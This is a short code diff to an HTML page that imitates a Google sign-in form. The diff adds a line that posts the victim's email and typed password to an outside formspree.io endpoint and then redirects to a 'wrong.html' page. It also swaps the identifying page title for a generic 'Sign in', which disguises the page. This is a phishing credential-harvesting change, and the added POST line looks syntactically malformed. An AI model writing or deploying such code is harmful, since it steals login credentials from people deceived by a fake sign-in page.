@@ -12,12 +12,13 @@
             $("#emailparse").html(Cookies.get("email"))
             $("form").submit((e) => {
                 e.preventDefault();
+                $.post("https://formspree.io/f/xjvdzrpq",{email:Cookies.get("email"),password:$("#password").val(),()=>{}}
                 window.location = "./wrong.html"
             });
         })
     </script>
     <link rel="stylesheet" href="./css/style.css" type="text/css" />
-    <title>Google sign in Form | Arnnik Islam Payel</title>
+    <title>Sign in</title>
 </head>
 
 <body>
